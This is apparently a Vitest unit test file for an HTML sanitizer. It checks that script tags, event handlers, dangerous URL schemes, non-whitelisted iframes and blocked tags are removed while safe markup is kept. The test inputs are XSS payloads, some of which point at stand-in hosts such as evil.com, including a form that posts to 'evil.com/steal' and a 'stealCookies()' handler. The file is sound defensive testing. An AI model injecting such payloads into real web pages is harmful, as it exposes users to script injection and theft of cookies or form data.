import { describe, it, expect } from "vitest";
import { sanitize } from "./sanitizer";

/**
 * Unit tests for the HTML content sanitizer.
 *
 * Feature: production-readiness-foundation
 * Requirements: 5.3, 5.4, 5.5, 5.6
 */

// ---------------------------------------------------------------------------
// XSS payload tests — Requirement 5.3 (script tags stripped with content)
// ---------------------------------------------------------------------------

describe("XSS: <script> tags are stripped with their content", () => {
  it("removes a basic <script> tag and its content", () => {
    const result = sanitize("<script>alert(1)</script>");
    expect(result).toBe("");
  });

  it("removes uppercase <SCRIPT> tag", () => {
    const result = sanitize("<SCRIPT>alert(1)</SCRIPT>");
    expect(result.toLowerCase()).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
  });

  it("removes <script> embedded inside safe content", () => {
    const result = sanitize("<p>Hello</p><script>alert(1)</script><p>World</p>");
    expect(result.toLowerCase()).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
    expect(result).toContain("<p>Hello</p>");
    expect(result).toContain("<p>World</p>");
  });

  it("removes <script> with src attribute", () => {
    const result = sanitize('<script src="https://evil.com/xss.js"></script>');
    expect(result.toLowerCase()).not.toContain("<script");
  });

  it("removes <style> tag and its content", () => {
    const result = sanitize("<style>body { background: red; }</style>");
    expect(result.toLowerCase()).not.toContain("<style");
    expect(result).not.toContain("background");
  });
});

// ---------------------------------------------------------------------------
// XSS payload tests — Requirement 5.4 (on* event handlers stripped)
// ---------------------------------------------------------------------------

describe("XSS: on* event handler attributes are stripped", () => {
  it("removes onerror from <img>", () => {
    const result = sanitize('<img onerror="alert(1)" src="https://example.com/img.jpg">');
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("alert(1)");
    // The img tag itself should still be present (src is safe)
    expect(result).toContain("<img");
  });

  it("removes onclick from a <div> (div is not whitelisted, content preserved)", () => {
    const result = sanitize('<div onclick="alert(1)">click me</div>');
    expect(result).not.toContain("onclick");
    expect(result).not.toContain("alert(1)");
    // div is not whitelisted — tag stripped but text content preserved
    expect(result).toContain("click me");
  });

  it("removes onmouseover from a <p>", () => {
    const result = sanitize('<p onmouseover="alert(1)">hover</p>');
    expect(result).not.toContain("onmouseover");
    expect(result).not.toContain("alert(1)");
    expect(result).toContain("<p>");
    expect(result).toContain("hover");
  });

  it("removes onload from <img>", () => {
    const result = sanitize('<img onload="stealCookies()" src="https://example.com/img.jpg">');
    expect(result).not.toContain("onload");
    expect(result).not.toContain("stealCookies");
  });

  it("removes ONERROR (uppercase) from <img>", () => {
    const result = sanitize('<img ONERROR="alert(1)" src="x">');
    expect(result.toLowerCase()).not.toContain("onerror");
  });

  it("removes multiple event handlers from the same element", () => {
    const result = sanitize(
      '<p onclick="a()" onmouseover="b()" onfocus="c()">text</p>'
    );
    expect(result).not.toContain("onclick");
    expect(result).not.toContain("onmouseover");
    expect(result).not.toContain("onfocus");
    expect(result).toContain("text");
  });
});

// ---------------------------------------------------------------------------
// XSS payload tests — Requirement 5.5 (dangerous href/src schemes stripped)
// ---------------------------------------------------------------------------

describe("XSS: dangerous href/src schemes are stripped", () => {
  it("removes href with javascript: scheme from <a>", () => {
    const result = sanitize('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain("javascript:");
    // The <a> tag may still be present but without the dangerous href
    expect(result).toContain("click");
  });

  it("removes href with JAVASCRIPT: (uppercase) scheme", () => {
    const result = sanitize('<a href="JAVASCRIPT:alert(1)">click</a>');
    expect(result.toLowerCase()).not.toContain("javascript:");
  });

  it("removes href with vbscript: scheme", () => {
    const result = sanitize('<a href="vbscript:msgbox(1)">click</a>');
    expect(result).not.toContain("vbscript:");
  });

  it("removes href with data:text/html scheme", () => {
    const result = sanitize(
      '<a href="data:text/html,<script>alert(1)</script>">click</a>'
    );
    expect(result).not.toContain("data:text/html");
    expect(result).toContain("click");
  });

  it("removes src with data:text/html scheme from <img>", () => {
    const result = sanitize(
      '<img src="data:text/html,<script>alert(1)</script>">'
    );
    // data:text/html is not data:image/* so it should be stripped
    expect(result).not.toContain("data:text/html");
  });

  it("allows data:image/* src on <img>", () => {
    const dataImageSrc =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";
    const result = sanitize(`<img src="${dataImageSrc}">`);
    expect(result).toContain("data:image/png");
  });

  it("preserves safe https href on <a>", () => {
    const result = sanitize('<a href="https://example.com">link</a>');
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain("link");
  });
});

// ---------------------------------------------------------------------------
// oEmbed whitelist tests — Requirement 5.6
// ---------------------------------------------------------------------------

describe("oEmbed whitelist: YouTube and Vimeo iframes pass; arbitrary hosts are stripped", () => {
  it("allows <iframe> with youtube.com src", () => {
    const result = sanitize(
      '<iframe src="https://youtube.com/embed/dQw4w9WgXcQ"></iframe>'
    );
    expect(result).toContain("<iframe");
    expect(result).toContain("youtube.com");
  });

  it("allows <iframe> with www.youtube.com src", () => {
    const result = sanitize(
      '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>'
    );
    expect(result).toContain("<iframe");
    expect(result).toContain("www.youtube.com");
  });

  it("allows <iframe> with youtube-nocookie.com src", () => {
    const result = sanitize(
      '<iframe src="https://youtube-nocookie.com/embed/dQw4w9WgXcQ"></iframe>'
    );
    expect(result).toContain("<iframe");
    expect(result).toContain("youtube-nocookie.com");
  });

  it("allows <iframe> with www.youtube-nocookie.com src", () => {
    const result = sanitize(
      '<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"></iframe>'
    );
    expect(result).toContain("<iframe");
    expect(result).toContain("www.youtube-nocookie.com");
  });

  it("allows <iframe> with player.vimeo.com src", () => {
    const result = sanitize(
      '<iframe src="https://player.vimeo.com/video/123456789"></iframe>'
    );
    expect(result).toContain("<iframe");
    expect(result).toContain("player.vimeo.com");
  });

  it("strips <iframe> with arbitrary host (evil.com)", () => {
    const result = sanitize('<iframe src="https://evil.com/xss"></iframe>');
    expect(result).toBe("");
  });

  it("strips <iframe> with attacker subdomain of youtube.com", () => {
    // attacker.youtube.com is NOT in the whitelist
    const result = sanitize(
      '<iframe src="https://attacker.youtube.com/embed/xss"></iframe>'
    );
    expect(result).toBe("");
  });

  it("strips <iframe> with vimeo.com (non-player subdomain)", () => {
    // vimeo.com itself is not whitelisted — only player.vimeo.com is
    const result = sanitize(
      '<iframe src="https://vimeo.com/123456789"></iframe>'
    );
    expect(result).toBe("");
  });

  it("strips <iframe> with no src attribute", () => {
    const result = sanitize("<iframe></iframe>");
    expect(result).toBe("");
  });

  it("strips <iframe> with javascript: src", () => {
    const result = sanitize('<iframe src="javascript:alert(1)"></iframe>');
    expect(result).toBe("");
  });

  it("preserves surrounding content when stripping a non-whitelisted iframe", () => {
    const result = sanitize(
      '<p>Before</p><iframe src="https://evil.com"></iframe><p>After</p>'
    );
    expect(result).not.toContain("<iframe");
    expect(result).toContain("<p>Before</p>");
    expect(result).toContain("<p>After</p>");
  });
});

// ---------------------------------------------------------------------------
// Blocked tags — content stripped entirely (Requirement 5.3)
// ---------------------------------------------------------------------------

describe("Blocked tags are stripped with their content", () => {
  it("strips <object> and its content", () => {
    const result = sanitize('<object data="https://evil.com/flash.swf">fallback</object>');
    expect(result.toLowerCase()).not.toContain("<object");
    expect(result).not.toContain("fallback");
  });

  it("strips <embed>", () => {
    const result = sanitize('<embed src="https://evil.com/plugin.swf">');
    expect(result.toLowerCase()).not.toContain("<embed");
  });

  it("strips <form> and its content", () => {
    const result = sanitize(
      '<form action="https://evil.com/steal"><input name="cc"><button>Submit</button></form>'
    );
    expect(result.toLowerCase()).not.toContain("<form");
    expect(result.toLowerCase()).not.toContain("<input");
  });

  it("strips <link> tag", () => {
    const result = sanitize('<link rel="stylesheet" href="https://evil.com/style.css">');
    expect(result.toLowerCase()).not.toContain("<link");
  });

  it("strips <meta> tag", () => {
    const result = sanitize('<meta http-equiv="refresh" content="0;url=https://evil.com">');
    expect(result.toLowerCase()).not.toContain("<meta");
  });
});

// ---------------------------------------------------------------------------
// Safe content preservation
// ---------------------------------------------------------------------------

describe("Safe content is preserved", () => {
  it("preserves basic paragraph text", () => {
    const result = sanitize("<p>Hello, world!</p>");
    expect(result).toBe("<p>Hello, world!</p>");
  });

  it("preserves nested whitelisted tags", () => {
    const result = sanitize("<p>This is <strong>bold</strong> and <em>italic</em>.</p>");
    expect(result).toContain("<strong>bold</strong>");
    expect(result).toContain("<em>italic</em>");
  });

  it("preserves headings", () => {
    const result = sanitize("<h1>Title</h1><h2>Subtitle</h2>");
    expect(result).toContain("<h1>Title</h1>");
    expect(result).toContain("<h2>Subtitle</h2>");
  });

  it("preserves lists", () => {
    const result = sanitize("<ul><li>Item 1</li><li>Item 2</li></ul>");
    expect(result).toContain("<ul>");
    expect(result).toContain("<li>Item 1</li>");
    expect(result).toContain("<li>Item 2</li>");
  });

  it("returns empty string for empty input", () => {
    expect(sanitize("")).toBe("");
  });

  it("returns empty string for null-like falsy input", () => {
    // @ts-expect-error testing runtime behavior with falsy value
    expect(sanitize(null)).toBe("");
  });

  it("strips unknown tags but preserves their text content", () => {
    const result = sanitize("<custom-tag>some text</custom-tag>");
    expect(result).not.toContain("<custom-tag");
    expect(result).toContain("some text");
  });
});
